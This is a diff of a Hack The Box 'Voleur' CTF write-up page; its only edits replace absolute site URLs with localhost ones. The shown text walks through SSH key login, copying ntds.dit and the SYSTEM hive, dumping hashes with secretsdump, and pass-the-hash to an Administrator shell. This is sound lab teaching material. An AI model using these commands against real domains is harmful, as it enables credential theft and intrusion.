+<p><img alt="21" loading="lazy" src="/images/writeups/voleur/21.png"></p>
 <p>To identify <strong>which user owns the private key</strong>, we generate the <strong>public key</strong> from it using:</p>
 <pre tabindex="0"><code>sudo ssh-keygen -y -f id_rsa
-</code></pre><p><img alt="22" loading="lazy" src="https://conper.github.io/images/writeups/voleur/22.png"></p>
+</code></pre><p><img alt="22" loading="lazy" src="/images/writeups/voleur/22.png"></p>
 <p>The user’s name often appears <strong>at the end of the public key</strong>, allowing us to confirm the owner.</p>
 <p>In the <strong>Nmap</strong> scan performed at the start, we had already identified that the <strong>SSH</strong> service is exposed on port <strong>2222</strong>.</p>
 <p>Before using the downloaded <strong>private key</strong>, we set the proper <strong>permissions</strong>.</p>
 <pre tabindex="0"><code>chmod 600 id_rsa
 </code></pre><p>With the key ready, we connect to the <strong>SSH</strong> server on port <strong>2222</strong> using the user <strong>svc_backup</strong>.</p>
 <pre tabindex="0"><code>ssh -i id_rsa -p 2222 svc_backup@voleur.htb
-</code></pre><p><img alt="23" loading="lazy" src="https://conper.github.io/images/writeups/voleur/23.png"></p>
+</code></pre><p><img alt="23" loading="lazy" src="/images/writeups/voleur/23.png"></p>
 <p>Connecting via <strong>SSH</strong>, we see we are in a <strong>Linux</strong> environment. Inspecting the <code>/mnt</code> mount point, we find the <strong>Windows C: volume</strong> accessible, meaning we can access the <strong>Windows filesystem</strong> from the <strong>Linux</strong> host. Inside <code>/mnt/c/IT/Third-Line Support</code>, we find a new folder called <em><strong>Backups</strong></em> and within it the <em><strong>Active Directory</strong></em> folder, which contains <code>ntds.dit</code> and <code>ntds.jfm</code>.</p>
-<p><img alt="24" loading="lazy" src="https://conper.github.io/images/writeups/voleur/24.png"></p>
+<p><img alt="24" loading="lazy" src="/images/writeups/voleur/24.png"></p>
 <ul>
 <li>
 <p><strong>ntds.dit</strong> is the <strong>main Active Directory database</strong>, storing <strong>user accounts</strong>, <strong>groups</strong>, <strong>policies</strong>, and password <strong>hashes</strong>.</p>
@@ -383,16 +317,16 @@ export KRB5CCNAME=$PWD/todd.wolfe.ccache
 <p>Next, we <strong>download them</strong> to our local machine so we can use them.</p>
 <pre tabindex="0"><code>scp -i id_rsa -P 2222 &#34;svc_backup@voleur.htb:/mnt/c/IT/Third-Line Support/Backups/Active Directory/*&#34; .
 </code></pre><p>In addition to the <strong>AD database</strong>, we also need the <strong>SYSTEM</strong> file, which contains keys required to decrypt the <strong>hashes</strong> stored in <code>ntds.dit</code>. It is located at <code>/mnt/c/IT/Third-Line Support/Backups/registry</code>.</p>
-<p><img alt="25" loading="lazy" src="https://conper.github.io/images/writeups/voleur/25.png"></p>
+<p><img alt="25" loading="lazy" src="/images/writeups/voleur/25.png"></p>
 <pre tabindex="0"><code>scp -i id_rsa -P 2222 &#34;svc_backup@voleur.htb:/mnt/c/IT/Third-Line Support/Backups/Registry/SYSTEM&#34; .
 </code></pre><p>With these three files locally, we use <code>impacket-secretsdump</code> to extract <strong>Active Directory account hashes</strong>.</p>
 <pre tabindex="0"><code>impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
-</code></pre><p><img alt="26" loading="lazy" src="https://conper.github.io/images/writeups/voleur/26.png"></p>
+</code></pre><p><img alt="26" loading="lazy" src="/images/writeups/voleur/26.png"></p>
 <p>Among the results, we obtain the <strong>NTLM hash</strong> of the <strong>Administrator</strong> account password, which we use to request a <strong>TGT</strong> for this user. With this <strong>TGT</strong>, we can authenticate as <strong>Administrator</strong> and access their privileges.</p>
 <pre tabindex="0"><code>faketime &#34;$(ntpdate -q voleur.htb | awk &#39;{print $1 &#34; &#34; $2}&#39;)&#34; impacket-getTGT -hashes :&lt;ADMINISTRATOR_NTLM_HASH&gt; voleur.htb/&#39;Administrator&#39;
 export KRB5CCNAME=$PWD/Administrator.ccache
 </code></pre><pre tabindex="0"><code>faketime &#34;$(ntpdate -q voleur.htb | awk &#39;{print $1 &#34; &#34; $2}&#39;)&#34; evil-winrm -i dc.voleur.htb -r voleur.htb
-</code></pre><p><img alt="27" loading="lazy" src="https://conper.github.io/images/writeups/voleur/27.png"></p>
+</code></pre><p><img alt="27" loading="lazy" src="/images/writeups/voleur/27.png"></p>
 <p>Finally, we obtain the <strong>Root Flag</strong> and complete the machine!!</p>
 
 
@@ -406,7 +340,7 @@ export KRB5CCNAME=$PWD/Administrator.ccache
     <li>Share: </li>
     <li>
         <a target="_blank" rel="noopener noreferrer" aria-label="share Voleur - Hack The Box on x"
-            href="https://x.com/intent/tweet/?text=Voleur%20-%20Hack%20The%20Box&amp;url=https%3a%2f%2fconper.github.io%2fwriteups%2fmedium%2fvoleur%2f&amp;hashtags=">
+            href="https://x.com/intent/tweet/?text=Voleur%20-%20Hack%20The%20Box&amp;url=http%3a%2f%2flocalhost%3a1313%2fwriteups%2fmedium%2fvoleur%2f&amp;hashtags=">
             <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                 <path
                     d="M512 62.554 L 512 449.446 C 512 483.97 483.97 512 449.446 512 L 62.554 512 C 28.03 512 0 483.97 0 449.446 L 0 62.554 C 0 28.03 28.029 0 62.554 0 L 449.446 0 C 483.971 0 512 28.03 512 62.554 Z M 269.951 190.75 L 182.567 75.216 L 56 75.216 L 207.216 272.95 L 63.9 436.783 L 125.266 436.783 L 235.9 310.383 L 332.567 436.783 L 456 436.783 L 298.367 228.367 L 432.367 75.216 L 371.033 75.216 Z M 127.633 110 L 164.101 110 L 383.481 400.065 L 349.5 400.065 Z" />
@@ -415,7 +349,7 @@ export KRB5CCNAME=$PWD/Administrator.ccache
     </li>
     <li>
         <a target="_blank" rel="noopener noreferrer" aria-label="share Voleur - Hack The Box on linkedin"
-            href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fconper.github.io%2fwriteups%2fmedium%2fvoleur%2f&amp;title=Voleur%20-%20Hack%20The%20Box&amp;summary=Voleur%20-%20Hack%20The%20Box&amp;source=https%3a%2f%2fconper.github.io%2fwriteups%2fmedium%2fvoleur%2f">
+            href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http%3a%2f%2flocalhost%3a1313%2fwriteups%2fmedium%2fvoleur%2f&amp;title=Voleur%20-%20Hack%20The%20Box&amp;summary=Voleur%20-%20Hack%20The%20Box&amp;source=http%3a%2f%2flocalhost%3a1313%2fwriteups%2fmedium%2fvoleur%2f">
             <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                 <path
                     d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
@@ -424,7 +358,7 @@ export KRB5CCNAME=$PWD/Administrator.ccache
     </li>
     <li>
         <a target="_blank" rel="noopener noreferrer" aria-label="share Voleur - Hack The Box on reddit"
-            href="https://reddit.com/submit?url=https%3a%2f%2fconper.github.io%2fwriteups%2fmedium%2fvoleur%2f&title=Voleur%20-%20Hack%20The%20Box">
+            href="https://reddit.com/submit?url=http%3a%2f%2flocalhost%3a1313%2fwriteups%2fmedium%2fvoleur%2f&title=Voleur%20-%20Hack%20The%20Box">
             <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                 <path
                     d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
@@ -433,7 +367,7 @@ export KRB5CCNAME=$PWD/Administrator.ccache
     </li>
     <li>
         <a target="_blank" rel="noopener noreferrer" aria-label="share Voleur - Hack The Box on facebook"
-            href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fconper.github.io%2fwriteups%2fmedium%2fvoleur%2f">
+            href="https://facebook.com/sharer/sharer.php?u=http%3a%2f%2flocalhost%3a1313%2fwriteups%2fmedium%2fvoleur%2f">
             <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                 <path
                     d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
@@ -442,7 +376,7 @@ export KRB5CCNAME=$PWD/Administrator.ccache
     </li>
     <li>
         <a target="_blank" rel="noopener noreferrer" aria-label="share Voleur - Hack The Box on whatsapp"
-            href="https://api.whatsapp.com/send?text=Voleur%20-%20Hack%20The%20Box%20-%20https%3a%2f%2fconper.github.io%2fwriteups%2fmedium%2fvoleur%2f">
+            href="https://api.whatsapp.com/send?text=Voleur%20-%20Hack%20The%20Box%20-%20http%3a%2f%2flocalhost%3a1313%2fwriteups%2fmedium%2fvoleur%2f">
             <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                 <path
                     d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
@@ -451,7 +385,7 @@ export KRB5CCNAME=$PWD/Administrator.ccache
     </li>
     <li>
         <a target="_blank" rel="noopener noreferrer" aria-label="share Voleur - Hack The Box on telegram"
-            href="https://telegram.me/share/url?text=Voleur%20-%20Hack%20The%20Box&amp;url=https%3a%2f%2fconper.github.io%2fwriteups%2fmedium%2fvoleur%2f">
+            href="https://telegram.me/share/url?text=Voleur%20-%20Hack%20The%20Box&amp;url=http%3a%2f%2flocalhost%3a1313%2fwriteups%2fmedium%2fvoleur%2f">
             <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28" height="30px" width="30px" fill="currentColor">
                 <path
                     d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
@@ -460,7 +394,7 @@ export KRB5CCNAME=$PWD/Administrator.ccache
     </li>
     <li>
         <a target="_blank" rel="noopener noreferrer" aria-label="share Voleur - Hack The Box on ycombinator"
-            href="https://news.ycombinator.com/submitlink?t=Voleur%20-%20Hack%20The%20Box&u=https%3a%2f%2fconper.github.io%2fwriteups%2fmedium%2fvoleur%2f">
+            href="https://news.ycombinator.com/submitlink?t=Voleur%20-%20Hack%20The%20Box&u=http%3a%2f%2flocalhost%3a1313%2fwriteups%2fmedium%2fvoleur%2f">
             <svg version="1.1" xml:space="preserve" width="30px" height="30px" viewBox="0 0 512 512" fill="currentColor"
                 xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape">
                 <path
@@ -475,7 +409,7 @@ export KRB5CCNAME=$PWD/Administrator.ccache
     </main>
     
 <footer class="footer">
-        <span>&copy; 2025 <a href="https://conper.github.io/">Conper</a></span>
+        <span>&copy; 2025 <a href="http://localhost:1313/">Conper</a></span>
 </footer>
 <a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
     <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
